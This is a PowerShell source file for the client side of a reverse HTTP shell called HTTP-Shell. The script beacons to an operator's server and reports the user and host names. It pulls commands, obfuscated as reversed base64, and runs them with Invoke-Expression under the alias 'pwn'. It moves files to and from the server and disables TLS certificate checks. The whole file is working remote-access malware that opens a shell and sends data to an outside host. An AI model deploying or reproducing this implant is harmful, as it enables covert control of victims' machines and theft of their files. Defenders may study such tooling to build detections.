#============================#
#  HTTP-Shell by @JoelGMSec  #
#    https://darkbyte.net    #
#============================#

# Variables
New-Alias -name pwn -Value iex -Force
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "Continue"
$server = $args[1] ; $sleeps = $args[3]

# Help
if (($args[0] -like "-h*") -or ($args[1] -eq $null)){
Write-Host "[!] Usage: .\HTTP-Client.ps1 -c [HOST:PORT] -s [SLEEP] (optional)`n" -ForegroundColor "Red" ; exit }

# Proxy Aware & TLS Legacy Support
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,
WebRequest request, int certificateProblem) {
return true; }}
"@

$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12"
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

# Functions
function Get-Env {
   $usr = $env:username.toLower()+"@"+$env:computername.toLower()
   $pwd = $pwd.path ; Write-Output "$usr!$pwd" | Out-String }

function R64Encoder {
   $ErrorActionPreference = "SilentlyContinue"
   if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
   if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")
   $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base 
   $ErrorActionPreference = "Continue" }

function R64Decoder {
   $ErrorActionPreference = "SilentlyContinue"
   $base64 = $args[1].ToCharArray() ; [array]::Reverse($base64) ; $base64 = -join $base64
   $base64 = [string]$base64.Replace("-", "+") ; $base64 = [string]$base64.Replace("_", "/")
   switch ($base64.Length % 4) { 0 { break } ; 2 { $base64 += "=="; break } ; 3 { $base64 += "="; break }}
   if ($args[0] -eq "-t") { $revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) ; $revb64 }
   if ($args[0] -eq "-f") { $revb64 = [System.Convert]::FromBase64String($base64) 2> $null ; return $revb64 }
   $ErrorActionPreference = "Continue" }

# Main
while ($true) {
   if ($sleeps) { Start-Sleep $sleeps }
   $env = Get-Env ; $commandx = $null ; $errorlog = $null ; $getenv64 = R64Encoder -t $env
   $request1 = $(Invoke-WebRequest -UseBasicParsing $server/api/info -Method Post -Body "Info: $getenv64") 2>&1> $null
   $response = $($token = Invoke-WebRequest -UseBasicParsing $server/api/token -Method Get) 2>&1> $null
   $invoke64 = R64Decoder -t ($token.ToString().Split(" ")[-1])

   if ($invoke64 -like "upload*") { 
      $file_path = $invoke64.Split(" ")[2] ; $invoke64 = $null
      $download = $($file_content = Invoke-WebRequest -UseBasicParsing $server/api/download -Method Get) 2>&1> $null
      $file_content = R64Decoder -f $file_content.ToString().Split(" ")[-1]
      [IO.File]::WriteAllBytes($file_path, $file_content)}

   if ($invoke64 -like "download*") {
      $file_path = $invoke64.Split(" ")[1] ; $invoke64 = $null
      $file_content = R64Encoder -f $file_path
      $upload = $(Invoke-WebRequest -UseBasicParsing $server/api/upload -Method Post -Body "File: $file_content") 2>&1> $null }

   if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64") | Out-String) 2>&1 ; $param = "Debug"
   if ($errorlog -ne $null) { $commandx = Write-Output $error[0] | Out-String ; $param = "Error" }
   if (($invoke64 -like "cd*") -or ($invoke64 -like "Set-Location*")) { if (!$errorlog) { $commandx = "HTTPShellNull" }}
   $output64 = R64Encoder -t $commandx ; [string]$path = $param.toLower()
   $request2 = $(Invoke-WebRequest -UseBasicParsing $server/api/$path -Method Post -Body "$param`: $output64") 2>&1> $null }}
